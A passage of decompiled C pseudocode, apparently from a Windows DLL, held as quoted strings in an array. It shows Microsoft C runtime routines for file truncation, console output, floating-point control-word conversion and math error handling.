    "    case 0x10000:",
    "    case 0x20000:",
    "      *((_BYTE *)&v4[1].LockSemaphore + v3) = v6 | 0x80;",
    "      *((_BYTE *)&lpCriticalSection[v2][1].LockSemaphore + v3 + 1) = 2;",
    "      break;",
    "    case 0x40000:",
    "      *((_BYTE *)&v4[1].LockSemaphore + v3) = v6 | 0x80;",
    "      *((_BYTE *)&lpCriticalSection[v2][1].LockSemaphore + v3 + 1) = 1;",
    "      break;",
    "  }",
    "  if ( (v6 & 0x80) == 0 )",
    "    return 0x8000;",
    "  if ( !v7 )",
    "    return 0x4000;",
    "  if ( v7 == 1 )",
    "    return 0x40000;",
    "  return v5;",
    "}",
    "",
    "",
    "__crt_seek_guard *__thiscall __crt_seek_guard::__crt_seek_guard(__crt_seek_guard *this, int FileHandle, __int64 a3)",
    "{",
    "  int v4; // edx",
    "  __int64 v5; // rax",
    "  int v6; // kr00_4",
    "  __crt_seek_guard *result; // eax",
    "",
    "  *(_DWORD *)this = _lseeki64_nolock(FileHandle, 0, 1u);",
    "  *((_DWORD *)this + 1) = v4;",
    "  LODWORD(v5) = _lseeki64_nolock(FileHandle, 0, 2u);",
    "  *((_DWORD *)this + 2) = v5;",
    "  v6 = a3 - v5;",
    "  *((_DWORD *)this + 6) = FileHandle;",
    "  *((_DWORD *)this + 5) = (unsigned __int64)(a3 - v5) >> 32;",
    "  result = this;",
    "  *((_DWORD *)this + 3) = HIDWORD(v5);",
    "  *((_DWORD *)this + 4) = v6;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _chsize_nolock(int FileHandle, LARGE_INTEGER liDistanceToMove)",
    "{",
    "  int v2; // esi",
    "  _BYTE v4[40]; // [esp+4h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v4, 0);",
    "  v2 = _chsize_nolock_internal(FileHandle, liDistanceToMove, (__crt_cached_ptd_host *)v4);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v4);",
    "  return v2;",
    "}",
    "",
    "",
    "int __cdecl _chsize_nolock_internal(int FileHandle, LARGE_INTEGER liDistanceToMove, __crt_cached_ptd_host *a3)",
    "{",
    "  void *v3; // esi",
    "  int v4; // ebx",
    "  int v5; // eax",
    "  DWORD v6; // ecx",
    "  int v7; // eax",
    "  int v8; // eax",
    "  unsigned int v9; // kr00_4",
    "  DWORD v10; // eax",
    "  int v11; // edx",
    "  void *osfhandle; // eax",
    "  DWORD LastError; // eax",
    "  LARGE_INTEGER v15; // [esp+Ch] [ebp-2Ch] BYREF",
    "  int v16; // [esp+14h] [ebp-24h]",
    "  int v17; // [esp+18h] [ebp-20h]",
    "  __int64 v18; // [esp+1Ch] [ebp-1Ch]",
    "  int v19; // [esp+24h] [ebp-14h]",
    "  int v20; // [esp+2Ch] [ebp-Ch]",
    "  int v21; // [esp+30h] [ebp-8h]",
    "  unsigned int v22; // [esp+34h] [ebp-4h]",
    "",
    "  __crt_seek_guard::__crt_seek_guard((__crt_seek_guard *)&v15, FileHandle, liDistanceToMove.QuadPart);",
    "  if ( (v15.HighPart & v15.LowPart) == -1 || (v17 & v16) == 0xFFFFFFFF )",
    "  {",
    "    if ( !*((_BYTE *)a3 + 28) )",
    "    {",
    "      v4 = 22;",
    "      goto LABEL_34;",
    "    }",
    "    goto LABEL_32;",
    "  }",
    "  v21 = HIDWORD(v18);",
    "  v22 = v18;",
    "  if ( v18 < 0 )",
    "  {",
    "LABEL_26:",
    "    v10 = _lseeki64_nolock(FileHandle, liDistanceToMove, 0);",
    "    if ( (v11 & v10) == 0xFFFFFFFF )",
    "    {",
    "      if ( *((_BYTE *)a3 + 28) )",
    "      {",
    "LABEL_32:",
    "        v4 = *((_DWORD *)a3 + 6);",
    "        goto LABEL_34;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      osfhandle = (void *)_get_osfhandle(FileHandle);",
    "      if ( !SetEndOfFile(osfhandle) )",
    "      {",
    "        LastError = GetLastError();",
    "        *((_BYTE *)a3 + 36) = 1;",
    "        *((_DWORD *)a3 + 8) = LastError;",
    "        v4 = 13;",
    "        *((_BYTE *)a3 + 28) = 1;",
    "        *((_DWORD *)a3 + 6) = 13;",
    "        goto LABEL_34;",
    "      }",
    "    }",
    "LABEL_17:",
    "    v4 = 0;",
    "    goto LABEL_34;",
    "  }",
    "  if ( v18 <= 0 )",
    "  {",
    "    if ( v18 >= 0 )",
    "      goto LABEL_17;",
    "    goto LABEL_26;",
    "  }",
    "  v3 = sub_10023CF0(0x1000u, 1u);",
    "  if ( !v3 )",
    "  {",
    "    v4 = 12;",
    "    *((_BYTE *)a3 + 28) = 1;",
    "    *((_DWORD *)a3 + 6) = 12;",
    "    goto LABEL_24;",
    "  }",
    "  v5 = sub_1002AC7E(FileHandle, 0x8000);",
    "  v6 = v18;",
    "  v20 = v5;",
    "  v7 = HIDWORD(v18);",
    "  while ( 1 )",
    "  {",
    "    if ( v7 >= 0 && (v7 > 0 || v6 >= 0x1000) )",
    "LABEL_11:",
    "      v6 = 4096;",
    "    v8 = _write_nolock(FileHandle, v3, v6, a3);",
    "    if ( v8 == -1 )",
    "      break;",
    "    v6 = v22 - v8;",
    "    v9 = v22 - v8;",
    "    v7 = (__PAIR64__(v21, v22) - v8) >> 32;",
    "    v22 = v9;",
    "    v21 = v7;",
    "    if ( v7 > 0 )",
    "      goto LABEL_11;",
    "    if ( v7 < 0 || !v6 )",
    "    {",
    "      sub_1002AC7E(FileHandle, v20);",
    "      _free_base(v3);",
    "      goto LABEL_17;",
    "    }",
    "  }",
    "  if ( *((_BYTE *)a3 + 36) && *((_DWORD *)a3 + 8) == 5 )",
    "  {",
    "    *((_BYTE *)a3 + 28) = 1;",
    "    *((_DWORD *)a3 + 6) = 13;",
    "  }",
    "  if ( *((_BYTE *)a3 + 28) )",
    "    v4 = *((_DWORD *)a3 + 6);",
    "  else",
    "    v4 = 0;",
    "LABEL_24:",
    "  _free_base(v3);",
    "LABEL_34:",
    "  _lseeki64_nolock(v19, v15, 0);",
    "  return v4;",
    "}",
    "",
    "",
    "wint_t __cdecl _putwch_nolock(wchar_t Character)",
    "{",
    "  DWORD NumberOfCharsWritten; // [esp+0h] [ebp-4h] BYREF",
    "",
    "  if ( ((int (__cdecl *)())sub_1002BA1A)() && unknown_libname_32(&Character, 1u, &NumberOfCharsWritten) )",
    "    return Character;",
    "  else",
    "    return -1;",
    "}",
    "",
    "",
    "size_t __cdecl __strncnt(const char *String, size_t Count)",
    "{",
    "  size_t result; // eax",
    "",
    "  result = 0;",
    "  if ( *String )",
    "  {",
    "    do",
    "    {",
    "      if ( result == Count )",
    "        break;",
    "      ++result;",
    "    }",
    "    while ( String[result] );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1002AFB8(int a1)",
    "{",
    "  int v1; // edx",
    "  int v2; // ecx",
    "  int v3; // edx",
    "  int v4; // ecx",
    "  int v5; // edx",
    "  int v6; // eax",
    "  int v7; // esi",
    "",
    "  v1 = (8 * (a1 & 0x10)) | 0x200;",
    "  if ( (a1 & 8) == 0 )",
    "    v1 = 8 * (a1 & 0x10);",
    "  v2 = v1 | 0x400;",
    "  if ( (a1 & 4) == 0 )",
    "    v2 = v1;",
    "  v3 = v2 | 0x800;",
    "  if ( (a1 & 2) == 0 )",
    "    v3 = v2;",
    "  v4 = v3 | 0x1000;",
    "  if ( (a1 & 1) == 0 )",
    "    v4 = v3;",
    "  v5 = v4 | 0x100;",
    "  if ( (a1 & 0x80000) == 0 )",
    "    v5 = v4;",
    "  v6 = a1 & 0x300;",
    "  if ( (a1 & 0x300) != 0 )",
    "  {",
    "    switch ( v6 )",
    "    {",
    "      case 256:",
    "        v5 |= 0x2000u;",
    "        break;",
    "      case 512:",
    "        v5 |= 0x4000u;",
    "        break;",
    "      case 768:",
    "        v5 |= 0x6000u;",
    "        break;",
    "    }",
    "  }",
    "  v7 = a1 & 0x3000000;",
    "  if ( (a1 & 0x3000000) == 0x1000000 )",
    "    return v5 | 0x8040;",
    "  if ( v7 == 0x2000000 )",
    "    return v5 | 0x40;",
    "  if ( v7 == 50331648 )",
    "    return v5 | 0x8000;",
    "  return v5;",
    "}",
    "",
    "",
    "int __usercall sub_1002B074@<eax>(char a1@<fpstat>)",
    "{",
    "  int v1; // esi",
    "  int v2; // edi",
    "  int v3; // edx",
    "  int v4; // ecx",
    "  int v5; // edx",
    "  int v6; // edx",
    "  int v7; // ecx",
    "  int v8; // edx",
    "  int v10; // ecx",
    "  int v11; // edx",
    "  int v12; // ecx",
    "  int v13; // edx",
    "  int v14; // [esp+8h] [ebp-8h]",
    "",
    "  __asm { fnclex }",
    "  if ( dword_1004014C < 1 )",
    "  {",
    "    v10 = 0;",
    "    if ( (a1 & 0x3F) != 0 )",
    "    {",
    "      v11 = (16 * (a1 & 1)) | 8;",
    "      if ( (a1 & 4) == 0 )",
    "        v11 = 16 * (a1 & 1);",
    "      v12 = v11 | 4;",
    "      if ( (a1 & 8) == 0 )",
    "        v12 = v11;",
    "      v13 = v12 | 2;",
    "      if ( (a1 & 0x10) == 0 )",
    "        v13 = v12;",
    "      v10 = v13 | 1;",
    "      if ( (a1 & 0x20) == 0 )",
    "        v10 = v13;",
    "      if ( (a1 & 2) != 0 )",
    "        return v10 | 0x80000;",
    "    }",
    "    return v10;",
    "  }",
    "  else",
    "  {",
    "    v1 = 0;",
    "    v2 = 0;",
    "    if ( (a1 & 0x3F) != 0 )",
    "    {",
    "      v3 = (16 * (a1 & 1)) | 8;",
    "      if ( (a1 & 4) == 0 )",
    "        v3 = 16 * (a1 & 1);",
    "      v4 = v3 | 4;",
    "      if ( (a1 & 8) == 0 )",
    "        v4 = v3;",
    "      v5 = v4 | 2;",
    "      if ( (a1 & 0x10) == 0 )",
    "        v5 = v4;",
    "      v2 = v5 | 1;",
    "      if ( (a1 & 0x20) == 0 )",
    "        v2 = v5;",
    "      if ( (a1 & 2) != 0 )",
    "        v2 |= 0x80000u;",
    "    }",
    "    v14 = _mm_getcsr();",
    "    _mm_setcsr(v14 & 0xFFFFFFC0);",
    "    if ( (v14 & 0x3F) != 0 )",
    "    {",
    "      v6 = (16 * (v14 & 1)) | 8;",
    "      if ( (v14 & 4) == 0 )",
    "        v6 = 16 * (v14 & 1);",
    "      v7 = v6 | 4;",
    "      if ( (v14 & 8) == 0 )",
    "        v7 = v6;",
    "      v8 = v7 | 2;",
    "      if ( (v14 & 0x10) == 0 )",
    "        v8 = v7;",
    "      v1 = v8 | 1;",
    "      if ( (v14 & 0x20) == 0 )",
    "        v1 = v8;",
    "      if ( (v14 & 2) != 0 )",
    "        v1 |= 0x80000u;",
    "    }",
    "    return v2 | v1;",
    "  }",
    "}",
    "",
    "",
    "int __cdecl sub_1002B18A(int a1, int a2)",
    "{",
    "  int v2; // edx",
    "  int v3; // esi",
    "  int v4; // ecx",
    "  int v5; // edx",
    "  int v6; // esi",
    "  int v7; // eax",
    "  int v8; // ecx",
    "  int v9; // esi",
    "  __int16 v10; // ax",
    "  int v11; // edx",
    "  int v12; // ecx",
    "  int v13; // edx",
    "  int v14; // ecx",
    "  int v15; // edx",
    "  int v16; // eax",
    "  unsigned int v17; // edi",
    "  int v18; // edx",
    "  int v19; // ecx",
    "  int v20; // edx",
    "  int v21; // ecx",
    "  int v22; // edx",
    "  int v23; // eax",
    "  int v24; // edi",
    "  int v25; // edi",
    "  int v26; // eax",
    "  unsigned int v27; // edi",
    "  int v28; // edx",
    "  int v29; // ecx",
    "  int v30; // edx",
    "  int v31; // ecx",
    "  int v32; // eax",
    "  int v33; // edi",
    "  int v34; // edi",
    "  int result; // eax",
    "  int v36; // [esp+10h] [ebp-Ch]",
    "  __int16 v37; // [esp+14h] [ebp-8h]",
    "  __int16 v38; // [esp+18h] [ebp-4h]",
    "",
    "  v2 = (16 * (v37 & 1)) | 8;",
    "  if ( (v37 & 4) == 0 )",
    "    v2 = 16 * (v37 & 1);",
    "  v3 = v2 | 4;",
    "  if ( (v37 & 8) == 0 )",
    "    v3 = v2;",
    "  v4 = v3 | 2;",
    "  if ( (v37 & 0x10) == 0 )",
    "    v4 = v3;",
    "  v5 = v4 | 1;",
    "  if ( (v37 & 0x20) == 0 )",
    "    v5 = v4;",
    "  v6 = v5 | 0x80000;",
    "  if ( (v37 & 2) == 0 )",
    "    v6 = v5;",
    "  v7 = v37 & 0xC00;",
    "  if ( (v37 & 0xC00) != 0 )",
    "  {",
    "    switch ( v7 )",
    "    {",
    "      case 1024:",
    "        v6 |= 0x100u;",
    "        break;",
    "      case 2048:",
    "        v6 |= 0x200u;",
    "        break;",
    "      case 3072:",
    "        v6 |= 0x300u;",
    "        break;",
    "    }",
    "  }",
    "  if ( (v37 & 0x300) != 0 )",
    "  {",
    "    if ( (v37 & 0x300) == 0x200 )",
    "      v6 |= 0x10000u;",
    "  }",
    "  else",
    "  {",
    "    v6 |= 0x20000u;",
    "  }",
    "  v8 = v6 | 0x40000;",
    "  if ( (v37 & 0x1000) == 0 )",
    "    v8 = v6;",
    "  v9 = a2 & a1 | v8 & ~a2;",
    "  if ( v9 != v8 )",
    "  {",
    "    v10 = sub_1002B4DA(a2 & a1 | v8 & ~a2);",
    "    v38 = v10;",
    "    v11 = (16 * (v10 & 1)) | 8;",
    "    if ( (v10 & 4) == 0 )",
    "      v11 = 16 * (v10 & 1);",
    "    v12 = v11 | 4;",
    "    if ( (v10 & 8) == 0 )",
    "      v12 = v11;",
    "    v13 = v12 | 2;",
    "    if ( (v10 & 0x10) == 0 )",
    "      v13 = v12;",
    "    v14 = v13 | 1;",
    "    if ( (v10 & 0x20) == 0 )",
    "      v14 = v13;",
    "    v15 = v14 | 0x80000;",
    "    if ( (v10 & 2) == 0 )",
    "      v15 = v14;",
    "    v16 = v10 & 0xC00;",
    "    if ( (v38 & 0xC00) != 0 )",
    "    {",
    "      switch ( v16 )",
    "      {",
    "        case 1024:",
    "          v15 |= 0x100u;",
    "          break;",
    "        case 2048:",
    "          v15 |= 0x200u;",
    "          break;",
    "        case 3072:",
    "          v15 |= 0x300u;",
    "          break;",
    "      }",
    "    }",
    "    if ( (v38 & 0x300) != 0 )",
    "    {",
    "      if ( (v38 & 0x300) == 0x200 )",
    "        v15 |= 0x10000u;",
    "    }",
    "    else",
    "    {",
    "      v15 |= 0x20000u;",
    "    }",
    "    v9 = v15 | 0x40000;",
    "    if ( (v38 & 0x1000) == 0 )",
    "      v9 = v15;",
    "  }",
    "  if ( dword_1004014C < 1 )",
    "    return v9;",
    "  v17 = _mm_getcsr();",
    "  v18 = (v17 >> 3) & 0x10 | 8;",
    "  if ( (v17 & 0x200) == 0 )",
    "    v18 = (v17 >> 3) & 0x10;",
    "  v19 = v18 | 4;",
    "  if ( (v17 & 0x400) == 0 )",
    "    v19 = v18;",
    "  v20 = v19 | 2;",
    "  if ( (v17 & 0x800) == 0 )",
    "    v20 = v19;",
    "  v21 = v20 | 1;",
    "  if ( (v17 & 0x1000) == 0 )",
    "    v21 = v20;",
    "  v22 = v21 | 0x80000;",
    "  if ( (v17 & 0x100) == 0 )",
    "    v22 = v21;",
    "  v23 = v17 & 0x6000;",
    "  if ( (v17 & 0x6000) != 0 )",
    "  {",
    "    switch ( v23 )",
    "    {",
    "      case 8192:",
    "        v22 |= 0x100u;",
    "        break;",
    "      case 16384:",
    "        v22 |= 0x200u;",
    "        break;",
    "      case 24576:",
    "        v22 |= 0x300u;",
    "        break;",
    "    }",
    "  }",
    "  v24 = (v17 & 0x8040) - 64;",
    "  if ( v24 )",
    "  {",
    "    v25 = v24 - 32704;",
    "    if ( v25 )",
    "    {",
    "      if ( v25 == 64 )",
    "        v22 |= 0x1000000u;",
    "    }",
    "    else",
    "    {",
    "      v22 |= 0x3000000u;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v22 |= 0x2000000u;",
    "  }",
    "  v26 = a1 & a2 & 0x308031F | v22 & ~(a2 & 0x308031F);",
    "  if ( v26 != v22 )",
    "  {",
    "    v36 = sub_1002AFB8(v26);",
    "    __set_fpsr_sse2(v36);",
    "    v27 = _mm_getcsr();",
    "    v28 = (v27 >> 3) & 0x10 | 8;",
    "    if ( (v27 & 0x200) == 0 )",
    "      v28 = (v27 >> 3) & 0x10;",
    "    v29 = v28 | 4;",
    "    if ( (v27 & 0x400) == 0 )",
    "      v29 = v28;",
    "    v30 = v29 | 2;",
    "    if ( (v27 & 0x800) == 0 )",
    "      v30 = v29;",
    "    v31 = v30 | 1;",
    "    if ( (v27 & 0x1000) == 0 )",
    "      v31 = v30;",
    "    v22 = v31 | 0x80000;",
    "    if ( (v27 & 0x100) == 0 )",
    "      v22 = v31;",
    "    v32 = v27 & 0x6000;",
    "    if ( (v27 & 0x6000) != 0 )",
    "    {",
    "      switch ( v32 )",
    "      {",
    "        case 8192:",
    "          v22 |= 0x100u;",
    "          break;",
    "        case 16384:",
    "          v22 |= 0x200u;",
    "          break;",
    "        case 24576:",
    "          v22 |= 0x300u;",
    "          break;",
    "      }",
    "    }",
    "    v33 = (v27 & 0x8040) - 64;",
    "    if ( v33 )",
    "    {",
    "      v34 = v33 - 32704;",
    "      if ( v34 )",
    "      {",
    "        if ( v34 == 64 )",
    "          v22 |= 0x1000000u;",
    "      }",
    "      else",
    "      {",
    "        v22 |= 0x3000000u;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v22 |= 0x2000000u;",
    "    }",
    "  }",
    "  result = v9 | v22;",
    "  if ( ((v9 ^ v22) & 0x8031F) != 0 )",
    "    return result | 0x80000000;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1002B4DA(unsigned int a1)",
    "{",
    "  int v1; // ecx",
    "  unsigned __int16 v2; // dx",
    "  unsigned __int16 v3; // cx",
    "  unsigned __int16 v4; // dx",
    "  unsigned __int16 v5; // cx",
    "  unsigned __int16 v6; // dx",
    "  unsigned __int16 v7; // cx",
    "  unsigned __int16 v8; // dx",
    "  unsigned __int16 v9; // cx",
    "  int v10; // edx",
    "  unsigned __int16 v11; // ax",
    "  int result; // eax",
    "",
    "  LOWORD(v1) = (a1 >> 4) & 1 | 4;",
    "  if ( (a1 & 8) == 0 )",
    "    v1 = (a1 >> 4) & 1;",
    "  v2 = v1;",
    "  v3 = v1 | 8;",
    "  if ( (a1 & 4) == 0 )",
    "    v3 = v2;",
    "  v4 = v3;",
    "  v5 = v3 | 0x10;",
    "  if ( (a1 & 2) == 0 )",
    "    v5 = v4;",
    "  v6 = v5;",
    "  v7 = v5 | 0x20;",
    "  if ( (a1 & 1) == 0 )",
    "    v7 = v6;",
    "  v8 = v7;",
    "  v9 = v7 | 2;",
    "  if ( (a1 & 0x80000) == 0 )",
    "    v9 = v8;",
    "  v10 = a1 & 0x300;",
    "  if ( (a1 & 0x300) != 0 )",
    "  {",
    "    switch ( v10 )",
    "    {",
    "      case 256:",
    "        v11 = v9 | 0x400;",
    "        break;",
    "      case 512:",
    "        v11 = v9 | 0x800;",
    "        break;",
    "      case 768:",
    "        v11 = v9 | 0xC00;",
    "        break;",
    "      default:",
    "        goto LABEL_19;",
    "    }",
    "    v9 = v11;",
    "  }",
    "LABEL_19:",
    "  if ( (a1 & 0x30000) != 0 )",
    "  {",
    "    if ( (a1 & 0x30000) == 0x10000 )",
    "      v9 |= 0x200u;",
    "  }",
    "  else",
    "  {",
    "    v9 |= 0x300u;",
    "  }",
    "  result = v9 | 0x1000;",
    "  if ( (a1 & 0x40000) == 0 )",
    "    return v9;",
    "  return result;",
    "}",
    "",
    "",
    "_DWORD *__cdecl __libm_error_support(__int64 *a1, __int64 *a2, __int64 *a3, int a4)",
    "{",
    "  int (__cdecl *v4)(int *); // edi",
    "  _DWORD *result; // eax",
    "  __int64 *v6; // esi",
    "  __int64 v7; // xmm0_8",
    "  int v8; // [esp+8h] [ebp-20h] BYREF",
    "  const char *v9; // [esp+Ch] [ebp-1Ch]",
    "  __int64 v10; // [esp+10h] [ebp-18h]",
    "  __int64 v11; // [esp+18h] [ebp-10h]",
    "  __int64 v12; // [esp+20h] [ebp-8h]",
    "",
    "  if ( dword_10040888 )",
    "    v4 = (int (__cdecl *)(int *))DecodePointer(Ptr);",
    "  else",
    "    v4 = (int (__cdecl *)(int *))sub_100253D0;",
    "  if ( a4 <= 26 )",
    "  {",
    "    if ( a4 != 26 )",
    "    {",
    "      if ( a4 <= 14 )",
    "      {",
    "        if ( a4 == 14 )",
    "        {",
    "          v8 = 3;",
    "          v9 = \"exp\";",
    "          goto LABEL_42;",
    "        }",
    "        if ( a4 == 2 )",
    "        {",
    "          v8 = 2;",
    "          v9 = (const char *)&unk_10035E28;",
    "          goto LABEL_42;",
    "        }",
    "        if ( a4 != 3 )",
    "        {",
    "          if ( a4 != 8 )",
    "          {",
    "            result = (_DWORD *)(a4 - 9);",
    "            if ( a4 != 9 )",
    "              return result;",
    "            v9 = \"log10\";",
    "            goto LABEL_38;",
    "          }",
    "          v8 = 2;",
    "          v9 = \"log10\";",
    "LABEL_42:",
    "          v6 = a3;",
    "          v10 = *a1;",
    "          v11 = *a2;",
    "          v12 = *a3;",
    "          result = (_DWORD *)v4(&v8);",
    "          if ( !result )",
    "          {",
    "            result = sub_1001E025();",
    "            *result = 34;",
    "          }",
    "          goto LABEL_44;",
    "        }",
    "        v9 = (const char *)&unk_10035E28;",
    "LABEL_38:",
    "        v6 = a3;",
    "        v8 = 1;",
    "        v10 = *a1;",
    "        v11 = *a2;",
    "        v12 = *a3;",
    "        result = (_DWORD *)v4(&v8);",
    "        if ( !result )",
    "        {",
    "          result = sub_1001E025();",
    "          *result = 33;",
    "        }",
    "        goto LABEL_44;",
    "      }",
    "      if ( a4 == 15 )",
    "      {",
    "        v9 = \"exp\";",
    "LABEL_21:",
    "        v6 = a3;",
    "        v8 = 4;",
    "        v10 = *a1;",
    "        v11 = *a2;",
    "        v12 = *a3;",
    "        result = (_DWORD *)v4(&v8);",
    "LABEL_44:",
    "        *v6 = v12;",
    "        return result;",
    "      }",
    "      if ( a4 != 24 )",
    "      {",
    "        result = (_DWORD *)(a4 - 25);",
    "        if ( a4 != 25 )",
    "          return result;",
    "        v9 = \"pow\";",
    "        goto LABEL_21;",
    "      }",
    "      v8 = 3;",
    "LABEL_41:",
    "      v9 = \"pow\";",
    "      goto LABEL_42;",
    "    }",
    "    v7 = 0x3FF0000000000000LL;",
    "LABEL_25:",
    "    result = a3;",
    "    *a3 = v7;",
    "    return result;",
    "  }",
    "  switch ( a4 )",
    "  {",
    "    case 27:",
    "      v8 = 2;",
    "      goto LABEL_41;",
    "    case 28:",
    "      v9 = \"pow\";",
    "      goto LABEL_38;",
    "    case 49:",
    "      v9 = \"sqrt\";",
    "      goto LABEL_38;",
    "    case 58:",
    "      v9 = \"acos\";",
    "      goto LABEL_38;",
    "    case 61:",
    "      v9 = \"asin\";",
    "      goto LABEL_38;",
    "  }",
    "  if ( a4 == 1000 || (result = (_DWORD *)(a4 - 1001), a4 == 1001) )",
    "  {",
    "    v7 = *a1;",
    "    goto LABEL_25;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "double __usercall _CIlog10@<st0>(double x@<st0>)",
    "{",
    "  int v1; // eax",
    "  bool v2; // zf",
    "  char v3; // [esp+4h] [ebp-8h]",
    "",
    "  if ( !dword_1004099C )",
    "    goto __CIlog10_default;",
    "  v1 = _mm_getcsr() & 0x7F80;",
    "  v2 = v1 == 8064;",
    "  if ( v1 == 8064 )",
    "    v2 = (v3 & 0x7F) == 127;",
    "  if ( v2 )",
    "  {",
    "    _CIlog10_pentium4();",
    "  }",
    "  else",
    "  {",
    "__CIlog10_default:",
    "    _checkTOS_withFB(LODWORD(x), HIDWORD(*(unsigned __int64 *)&x));",
    "    return ((double (*)(void))start)();",
    "  }",
    "  return x;",
    "}",
    "",
    "",
    "int __acrt_initialize_sse2()",
    "{",
    "  dword_1004099C = IsProcessorFeaturePresent(0xAu);",
    "  return 0;",
    "}",
    "",
    "",
    "double __usercall sub_1002B910@<st0>(double result@<st0>, double a2)",
    "{",
    "  int v2; // ebx",
    "  int v3; // eax",
    "",
    "  v2 = sub_1002BB36(6975, 0xFFFF);",
    "  if ( (HIDWORD(a2) & 0x7FF00000) == 0x7FF00000 )",
    "  {",
    "    v3 = sub_1002CEF0(LODWORD(a2), HIDWORD(a2)) - 1;",
    "    if ( v3 && (unsigned int)(v3 - 1) >= 2 )",
    "    {",
    "      return sub_1002C4D0(",
    "               8,",
    "               12,",
    "               LODWORD(a2),",
    "               HIDWORD(a2),",
    "               COERCE_UNSIGNED_INT64(a2 + 1.0),",
    "               HIDWORD(COERCE_UNSIGNED_INT64(a2 + 1.0)),",
    "               v2);",
    "    }",
    "    else",
    "    {",
    "      sub_1002BB36(v2, 0xFFFF);",
    "      return a2;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    _frnd(a2);",
    "    if ( result == a2 || (v2 & 0x20) != 0 )",
    "      sub_1002BB36(v2, 0xFFFF);",
    "    else",
    "      return sub_1002C4D0(16, 12, LODWORD(a2), HIDWORD(a2), LODWORD(result), HIDWORD(*(unsigned __int64 *)&result), v2);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __acrt_initialize_fmode()",
    "{",
    "  if ( !dword_1004088C )",
    "    dword_1004088C = 0x4000;",
    "  return 0;",
    "}",
    "",
    "",
    "void __cdecl __dcrt_lowio_initialize_console_output()",
    "{",
    "  hConsoleOutput = CreateFileW(L\"CONOUT$\", 0x40000000u, 3u, 0, 3u, 0, 0);",
    "}",
    "",
    "",
    "BOOL sub_1002BA1A()",
    "{",
    "  char *v0; // ecx",
    "",
    "  v0 = (char *)hConsoleOutput;",
    "  if ( hConsoleOutput == (HANDLE)-2 )",
    "  {",
    "    __dcrt_lowio_initialize_console_output();",
    "    v0 = (char *)hConsoleOutput;",
    "  }",
    "  return v0 + 1 != 0;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "HANDLE unknown_libname_31()",
    "{",
    "}// Microsoft VisualC universal runtime",
    "BOOL __cdecl unknown_libname_32(void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten)",
    "{",
    "}unsigned int __cdecl __set_fpsr_sse2(unsigned int a1)",
    "{",
    "  unsigned int result; // eax",
    "",
    "  if ( dword_1004014C >= 1 )",
    "  {",
    "    result = a1;",
    "    if ( (a1 & 0x40) != 0 && dword_1003FAC4 )",
    "    {",
    "      _mm_setcsr(a1);",
    "    }",
    "    else",
    "    {",
    "      result = a1 & 0xFFFFFFBF;",
    "      _mm_setcsr(a1 & 0xFFFFFFBF);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __usercall _clrfp@<eax>(__int16 a1@<fpstat>)",
    "{",
    "  __asm { fnclex }",
    "  return a1;",
    "}",
    "",
    "",
    "int sub_1002BB36()",
    "{",
    "  __int16 v1; // [esp+4h] [ebp-4h]",
    "",
    "  return v1;",
    "}",
    "",
    "",
    "void _set_statfp()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "int __usercall _statfp@<eax>(__int16 a1@<fpstat>)",
    "{",
    "  return a1;",
    "}",
    "",
    "",
    "int __usercall _CIlog10_pentium4@<eax>(__int64 a1@<st0>)",
    "{",
    "  return start_0(a1);",
    "}",
    "",
    "",
    "double __usercall start_0@<st0>(__m128d a1@<xmm0>, double a2)",
    "{",
    "  int i; // edx",
    "  __m128i v3; // xmm5",
    "  __m128i v4; // xmm2",
    "  __m128d v5; // xmm0",
    "  int v6; // eax",
    "  __m128d v7; // xmm4",
    "  __m128d v8; // xmm6",
    "  __m128d v9; // xmm0",
    "  __m128d v10; // xmm6",
    "  __m128d v11; // xmm7",
    "  __m128d v12; // xmm4",
    "  unsigned int v13; // ecx",
    "  int v14; // ecx",
    "  __m128d v15; // xmm6",
    "  int v16; // edx",
    "  __m128d v17; // xmm3",
    "  __m128d v18; // xmm7",
    "  double v19; // xmm2_8",
    "  __m128d v20; // xmm0",
    "  __m128d v22; // xmm0",
    "  __m128i v23; // xmm1",
    "  int v24; // edx",
    "  double v25; // [esp+10h] [ebp-Ch] BYREF",
    "",
    "  for ( i = 0; ; i = -52 )",
    "  {",
    "    v3 = (__m128i)a1;",
    "    v4.m128i_i64[1] = 0x3FDBC00000000000LL;",
    "    v5 = _mm_or_pd(_mm_and_pd(_mm_unpacklo_pd(a1, a1), (__m128d)xmmword_100366C0), (__m128d)xmmword_10036730);",
    "    v6 = _mm_extract_epi16((__m128i)_mm_add_pd((__m128d)xmmword_100366E0, v5), 0) & 0x7F0;",
    "    v7 = *(__m128d *)((char *)&xmmword_10036280 + v6);",
    "    v11 = *(__m128d *)((char *)&xmmword_10035E70 + v6);",
    "    v8 = _mm_and_pd((__m128d)xmmword_100366F0, v5);",
    "    v9 = _mm_sub_pd(v5, v8);",
    "    v10 = _mm_sub_pd(_mm_mul_pd(v8, v7), (__m128d)xmmword_100366D0);",
    "    v11.m128d_f64[0] = v11.m128d_f64[0] + v10.m128d_f64[0];",
    "    v12 = _mm_mul_pd(v9, v7);",
    "    a1 = _mm_add_pd(v12, v10);",
    "    v13 = (_mm_extract_epi16(_mm_srli_epi64(v3, 0x34u), 0) & 0xFFF) - 1;",
    "    if ( v13 <= 0x7FD )",
    "      break;",
    "    v22.m128d_f64[0] = a2;",
    "    v23 = (__m128i)_mm_cmpeq_sd((__m128d)xmmword_10036740, v22);",
    "    if ( _mm_extract_epi16(v23, 0) )",
    "    {",
    "      *(double *)v23.m128i_i64 = -INFINITY;",
    "      v24 = 8;",
    "CALL_LIBM_ERROR_0:",
    "      v25 = *(double *)v23.m128i_i64;",
